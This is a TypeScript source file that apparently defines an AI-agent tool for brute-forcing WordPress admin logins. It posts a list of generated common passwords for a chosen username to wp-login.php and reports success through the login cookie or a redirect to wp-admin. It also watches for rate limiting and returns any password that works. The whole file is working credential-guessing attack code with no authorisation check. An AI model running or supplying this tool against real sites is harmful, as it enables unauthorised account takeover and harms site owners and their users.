import { createTool } from "@mastra/core/tools";
import { httpClient } from "../services/httpClient";
import { z } from "zod";
import { generateCommonPasswords } from "../utils/passwordgenerator";




export const loginAttemptTool = createTool({
  id: "login_attempt_tool",
  description:
    "Attempt controlled weak password login on WordPress admin panel.",

  inputSchema: z.object({
    url: z.string().describe("Base URL of the WordPress target"),
    username: z.string().describe("Discovered WordPress username")
  }),

 execute: async ({ url, username }) => {
  try {
    const cleanUrl = url.replace(/\/$/, "");
    const loginUrl = `${cleanUrl}/wp-login.php`;

    const passwords = generateCommonPasswords(username);

    for (const password of passwords) {
      const response = await httpClient.post(
        loginUrl,
        new URLSearchParams({
          log: username,
          pwd: password,
          "wp-submit": "Log In",
          redirect_to: `${cleanUrl}/wp-admin/`,
          testcookie: "1"
        }).toString(),
        {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          maxRedirects: 0,
          validateStatus: () => true
        }
      );

      if (!response.success) continue;
      const setCookieHeader = response.headers?.["set-cookie"];
        const cookieString = Array.isArray(setCookieHeader) 
            ? setCookieHeader.join(" ") 
            : (setCookieHeader || "")

            const isLoggedIn = cookieString.includes("wordpress_logged_in");
        const isRedirect = response.status === 302 && 
  response.headers?.location?.includes("/wp-admin");
      if (isLoggedIn || isRedirect) {
        return {
          success: true,
          technique: "WEAK_PASSWORD",
          username,
          password
        };
      }

      if (
        response.data &&
        typeof response.data === "string" &&
        response.data.toLowerCase().includes("too many")
      ) {
        return {
          success: false,
          protectionDetected: true,
          message: "Rate limiting detected"
        };
      }
    }

    return {
      success: false,
      message: "No weak password found"
    };

  } catch (error: any) {
    return {
      success: false,
      message: "Unexpected error during login attempts",
      error: error.message
    };
  }
}
});